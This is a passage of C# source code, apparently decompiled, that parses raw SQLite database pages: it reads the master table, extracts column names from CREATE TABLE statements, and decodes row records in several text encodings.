                                Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)),
                                    new decimal(numArray[0]))), (int)numArray[1]);
                        master_table_entries[length + i].root_num =
                            (long)ConvertToInteger(
                                Convert.ToInt32(decimal.Add(
                                    decimal.Add(
                                        decimal.Add(decimal.Add(new decimal(num), new decimal(num5)),
                                            new decimal(numArray[0])), new decimal(numArray[1])),
                                    new decimal(numArray[2]))), (int)numArray[3]);
                        if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                            master_table_entries[length + i].sql_statement = Encoding.Default.GetString(db_bytes,
                                Convert.ToInt32(decimal.Add(
                                    decimal.Add(
                                        decimal.Add(
                                            decimal.Add(decimal.Add(new decimal(num), new decimal(num5)),
                                                new decimal(numArray[0])), new decimal(numArray[1])),
                                        new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
                        else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                            master_table_entries[length + i].sql_statement = Encoding.Unicode.GetString(db_bytes,
                                Convert.ToInt32(decimal.Add(
                                    decimal.Add(
                                        decimal.Add(
                                            decimal.Add(decimal.Add(new decimal(num), new decimal(num5)),
                                                new decimal(numArray[0])), new decimal(numArray[1])),
                                        new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
                        else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                            master_table_entries[length + i].sql_statement = Encoding.BigEndianUnicode.GetString(db_bytes,
                                Convert.ToInt32(decimal.Add(
                                    decimal.Add(
                                        decimal.Add(
                                            decimal.Add(decimal.Add(new decimal(num), new decimal(num5)),
                                                new decimal(numArray[0])), new decimal(numArray[1])),
                                        new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
                    }
                }
                else if (db_bytes[(int)Offset] == 5)
                {
                    var num11 = Convert.ToUInt16(
                        decimal.Subtract(
                            new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)),
                            decimal.One));
                    int num14 = num11;
                    for (var j = 0; j <= num14; j++)
                    {
                        var startIndex =
                            (ushort)ConvertToInteger(
                                Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(j * 2))), 2);
                        if (decimal.Compare(new decimal(Offset), 100M) == 0)
                            ReadMasterTable(Convert.ToUInt64(
                                decimal.Multiply(
                                    decimal.Subtract(new decimal(ConvertToInteger(startIndex, 4)), decimal.One),
                                    new decimal(page_size))));
                        else
                            ReadMasterTable(Convert.ToUInt64(
                                decimal.Multiply(
                                    decimal.Subtract(new decimal(ConvertToInteger((int)(Offset + startIndex), 4)),
                                        decimal.One), new decimal(page_size))));
                    }
                    ReadMasterTable(Convert.ToUInt64(
                        decimal.Multiply(
                            decimal.Subtract(
                                new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)),
                                decimal.One), new decimal(page_size))));
                }
            }

            public bool ReadTable(string TableName)
            {
                var index = -1;
                var length = master_table_entries.Length - 1;
                for (var i = 0; i <= length; i++)
                    if (master_table_entries[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
                    {
                        index = i;
                        break;
                    }
                if (index == -1)
                    return false;
                var strArray = master_table_entries[index].sql_statement
                    .Substring(master_table_entries[index].sql_statement.IndexOf("(") + 1).Split(',');
                var num6 = strArray.Length - 1;
                for (var j = 0; j <= num6; j++)
                {
                    strArray[j] = strArray[j].TrimStart();
                    var num4 = strArray[j].IndexOf(" ");
                    if (num4 > 0)
                        strArray[j] = strArray[j].Substring(0, num4);
                    if (strArray[j].IndexOf("UNIQUE") == 0)
                        break;
                    field_names = (string[])Utils.CopyArray(field_names, new string[j + 1]);
                    field_names[j] = strArray[j];
                }
                return ReadTableFromOffset((ulong)((master_table_entries[index].root_num - 1L) * page_size));
            }

            private bool ReadTableFromOffset(ulong Offset)
            {
                if (db_bytes[(int)Offset] == 13)
                {
                    var num2 = Convert.ToInt32(decimal.Subtract(
                        new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)),
                        decimal.One));
                    var length = 0;
                    if (table_entries != null)
                    {
                        length = table_entries.Length;
                        table_entries =
                            (table_entry[])Utils.CopyArray(table_entries,
                                new table_entry[table_entries.Length + num2 + 1]);
                    }
                    else
                    {
                        table_entries = new table_entry[num2 + 1];
                    }
                    var num16 = num2;
                    for (var i = 0; i <= num16; i++)
                    {
                        record_header_field[] _fieldArray = null;
                        var num = ConvertToInteger(
                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                        if (decimal.Compare(new decimal(Offset), 100M) != 0)
                            num += Offset;
                        var endIndex = GVL((int)num);
                        var num9 = CVL((int)num, endIndex);
                        var num8 = GVL(Convert.ToInt32(
                            decimal.Add(
                                decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))),
                                decimal.One)));
                        table_entries[length + i].row_id =
                            CVL(
                                Convert.ToInt32(decimal.Add(
                                    decimal.Add(new decimal(num),
                                        decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)), num8);
                        num = Convert.ToUInt64(decimal.Add(
                            decimal.Add(new decimal(num), decimal.Subtract(new decimal(num8), new decimal(num))),
                            decimal.One));
                        endIndex = GVL((int)num);
                        num8 = endIndex;
                        var num7 = CVL((int)num, endIndex);
                        var num10 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num), new decimal(endIndex)),
                            decimal.One));
                        for (var j = 0; num10 < num7; j++)
                        {
                            _fieldArray =
                                (record_header_field[])Utils.CopyArray(_fieldArray, new record_header_field[j + 1]);
                            endIndex = num8 + 1;
                            num8 = GVL(endIndex);
                            _fieldArray[j].type = CVL(endIndex, num8);
                            if (_fieldArray[j].type > 9L)
                                if (IsOdd(_fieldArray[j].type))
                                    _fieldArray[j].size = (long)Math.Round((_fieldArray[j].type - 13L) / 2.0);
                                else
                                    _fieldArray[j].size = (long)Math.Round((_fieldArray[j].type - 12L) / 2.0);
                            else
                                _fieldArray[j].size = SQLDataTypeSize[(int)_fieldArray[j].type];
                            num10 = num10 + (num8 - endIndex) + 1L;
                        }
                        table_entries[length + i].content = new string[_fieldArray.Length - 1 + 1];
                        var num4 = 0;
                        var num17 = _fieldArray.Length - 1;
                        for (var k = 0; k <= num17; k++)
                        {
                            if (_fieldArray[k].type > 9L)
                                if (!IsOdd(_fieldArray[k].type))
                                {
                                    if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                                        table_entries[length + i].content[k] = Encoding.Default.GetString(db_bytes,
                                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)),
                                                new decimal(num4))), (int)_fieldArray[k].size);
                                    else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                                        table_entries[length + i].content[k] = Encoding.Unicode.GetString(db_bytes,
                                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)),
                                                new decimal(num4))), (int)_fieldArray[k].size);
                                    else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                                        table_entries[length + i].content[k] = Encoding.BigEndianUnicode.GetString(db_bytes,
                                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)),
                                                new decimal(num4))), (int)_fieldArray[k].size);
                                }
                                else
                                {
                                    table_entries[length + i].content[k] = Encoding.Default.GetString(db_bytes,
                                        Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)),
                                            new decimal(num4))), (int)_fieldArray[k].size);
                                }
                            else
                                table_entries[length + i].content[k] =
                                    Conversions.ToString(
                                        ConvertToInteger(
                                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)),
                                                new decimal(num4))), (int)_fieldArray[k].size));
                            num4 += (int)_fieldArray[k].size;
                        }
                    }
                }
                else if (db_bytes[(int)Offset] == 5)
                {
                    var num14 = Convert.ToUInt16(
                        decimal.Subtract(
                            new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)),
                            decimal.One));
                    int num18 = num14;
                    for (var m = 0; m <= num18; m++)
                    {
                        var num13 = (ushort)ConvertToInteger(
                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(m * 2))), 2);
                        ReadTableFromOffset(Convert.ToUInt64(
                            decimal.Multiply(
                                decimal.Subtract(new decimal(ConvertToInteger((int)(Offset + num13), 4)), decimal.One),
                                new decimal(page_size))));
                    }
                    ReadTableFromOffset(Convert.ToUInt64(
                        decimal.Multiply(
                            decimal.Subtract(
                                new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)),
                                decimal.One), new decimal(page_size))));
                }
                return true;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct record_header_field
            {
                public long size;
                public long type;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct sqlite_master_entry
            {
                public long row_id;
                public string item_type;
                public string item_name;
                public readonly string astable_name;
                public long root_num;
                public string sql_statement;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct table_entry
            {
                public long row_id;
                public string[] content;
            }
        }
        #endregion
   
    }

}
